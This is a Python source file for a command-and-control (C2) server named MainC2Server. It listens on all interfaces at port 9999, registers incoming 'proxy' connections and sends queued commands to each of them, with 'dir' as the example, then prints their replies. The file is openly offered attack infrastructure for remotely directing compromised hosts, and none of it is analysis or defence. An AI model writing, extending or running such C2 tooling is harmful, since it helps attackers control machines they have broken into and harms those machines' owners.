import socket
import threading
import queue

class  MainC2Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.proxy_connections = []  # List to store proxy server connections
        self.command_queue = queue.Queue()  # Command queue to manage commands

    def start_server(self):
        try:
            # Start the server
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.bind((self.host, self.port)) # bind the server to the host and port
            server_socket.listen(5) # listen for up to 5 connections
            print(f"[*] Listening on {self.host}:{self.port}")

            # Accept connections
            while True:
                # Accept incoming connections from proxies
                client_socket, client_address = server_socket.accept()
                print(f"New proxy connection from {client_address}")
                
                # Add the proxy connection to the list
                self.add_proxy_connection(client_socket)
                
                # Start a new thread to handle communication with the proxy
                threading.Thread(target=self.handle_proxy_connection, args=(client_socket,)).start()
        
        except Exception as e:
            print(f"Error starting server: {e}")

    def add_proxy_connection(self, client_socket):
        # Add the proxy connection to the list
        self.proxy_connections.append(client_socket)

    def send_command(self, proxy_socket, command):
        """Send a command to a specific proxy."""
        try:
            # Send command to proxy
            proxy_socket.send(command.encode('utf-8'))
            print(f"Command sent to proxy: {command}")
        except Exception as e:
            print(f"Error sending command to proxy: {e}")

    def receive_response(self, proxy_socket):
        """Receive response from a proxy."""
        try:
            # Receive response from proxy
            response = proxy_socket.recv(1024).decode('utf-8')
            print(f"Response received from proxy: {response}")
            return response
        except Exception as e:
            print(f"Error receiving response from proxy: {e}")
            return None
        
    def dispatch_commands(self):
        """Dispatch commands from the queue to connected proxies."""
        while True:
            # Wait for a command in the queue
            command = self.command_queue.get()
            
            if not self.proxy_connections:
                print("No proxies connected.")
                continue
            
            # Dispatch command to each proxy
            for proxy_socket in self.proxy_connections:
                self.send_command(proxy_socket, command)
                response = self.receive_response(proxy_socket)
                if response:
                    print(f"Response from proxy: {response}")
                else:
                    print("No response received from proxy.")
    
    def handle_proxy_connection(self, proxy_socket):
        """Handles the connection lifecycle for a proxy server."""
        try:
            while True:
                # Keep the connection alive and check for messages from the proxy
                data = proxy_socket.recv(1024).decode('utf-8')
                
                if data:
                    print(f"Received from proxy: {data}")
                    # Optionally, forward this data back to the operator or handle it
                else:
                    print("Proxy disconnected.")
                    self.proxy_connections.remove(proxy_socket)
                    proxy_socket.close()
                    break
                
        except Exception as e:
            print(f"Error with proxy connection: {e}")
            self.proxy_connections.remove(proxy_socket)
            proxy_socket.close()


if __name__ == "__main__":
    # Initialize Main C2 Server
    server = MainC2Server('0.0.0.0', 9999)
    
    # Start server in a separate thread
    threading.Thread(target=server.start_server).start()
    
    # Dispatch commands (example)
    server.command_queue.put("dir")  # Put command in queue
    server.dispatch_commands()  # Dispatch commands to proxies


            
